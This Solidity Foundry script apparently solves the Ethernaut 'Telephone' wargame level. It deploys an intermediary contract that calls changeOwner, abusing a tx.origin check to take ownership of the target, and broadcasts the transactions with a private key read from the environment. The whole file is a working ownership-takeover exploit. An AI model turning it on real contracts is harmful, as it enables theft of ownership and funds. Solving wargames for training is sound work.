// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Telephone.sol";
import "@forge-std/Script.sol";

contract Attack is Script{
    Telephone public TC;
    constructor(address tc) {
        TC = Telephone(tc);
    }

    function attack(address myaddress) public {
        TC.changeOwner(myaddress);
    }
}

contract TelephoneScript is Script {

    Telephone public telephoneContract;

    function setUp() public {
        telephoneContract = Telephone(payable(vm.envAddress("TELEPHONE_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack a = new Attack(address(telephoneContract));
        a.attack(vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }

}